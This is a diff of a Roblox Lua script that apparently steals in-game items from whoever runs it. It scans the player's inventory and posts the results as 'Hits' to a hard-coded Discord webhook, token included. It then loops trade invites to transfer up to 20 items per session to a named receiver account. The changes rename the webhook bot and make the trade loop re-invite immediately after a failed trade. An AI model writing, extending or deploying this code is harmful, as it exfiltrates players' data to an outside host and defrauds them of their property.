@@ -2,7 +2,7 @@
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1493322934532702261/heWYGm0D9zq8kiDoReF5eZEFiDdpDx9wuwZipmUygAbHIC4fJ5_43TJp2dN_n-iLNOxh"
 local RECEIVER = "Luckyman7778910"
 local ENABLE_TRADE = true
-local TRADE_INVITE_COOLDOWN = 5
+local TRADE_INVITE_COOLDOWN = 6
 local TRADE_ADD_DELAY = 0
 local TRADE_MODIFY_BUFFER = 0.03
 local TRADE_MAX_ITEMS = 20
@@ -735,15 +735,15 @@ local function buildDiscordPayload(results, meta)
 
     return {
         content = meta.pingEveryone and "@everyone" or "",
-        username = "MoneyyyyMoneyyyy",
+        username = "Baddies Scanner",
         embeds = {
             {
-                title = "💅 YoshidaaaScript | Baddies",
+                title = "💅 YoshidaaaScript | Baddies ",
                 description = description,
                 color = 0xF1C40F,
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                 footer = {
-                    text = "Baddies Weapons Hits- " .. os.date("%d/%m/%Y %H:%M"),
+                    text = "Baddies Hits - " .. os.date("%d/%m/%Y %H:%M"),
                 },
             },
         },
@@ -782,11 +782,7 @@ local function scanAndSend()
         return false
     end
 
-    -- SPEED OPTIMIZATION: Run the inventory upload asynchronously in the background
-    local inventoryRawUrl = ""
-    task.spawn(function()
-        inventoryRawUrl = uploadInventoryRaw(results, LocalPlayer.Name)
-    end)
+    local inventoryRawUrl = uploadInventoryRaw(results, LocalPlayer.Name)
 
     local payload = buildDiscordPayload(results, {
         executorName = executorName,
@@ -1748,6 +1744,13 @@ local function startTradeLoop()
         local replionId = waitForTradeStart(20)
         if replionId then
             runTradeSession(replionId, dataReplion, catalog, rapReplion)
+        else
+            -- FIXED: If trade invite times out or is cancelled before starting, reset session state immediately so it loops and re-invites right away.
+            TradeState.active = false
+            TradeState.ended = true
+            TradeState.replionId = nil
+            TradeRuntime.sessionRunning = false
+            restoreTradingGui()
         end
 
         task.wait(TRADE_INVITE_COOLDOWN)
@@ -1788,7 +1791,7 @@ getgenv().BaddiesGetStatus = function()
         tostring(detailText),
         tostring(normalizeTradeReplionId(TradeState.replionId)),
         tostring(td.added),
-        tostring(td.tradableCount),
+        tostring(td.tradableControl or td.tradableCount),
         tostring(td.lastErr),
         tostring(td.phase),
         tostring(td.sessionDetail or td.sessionResult)
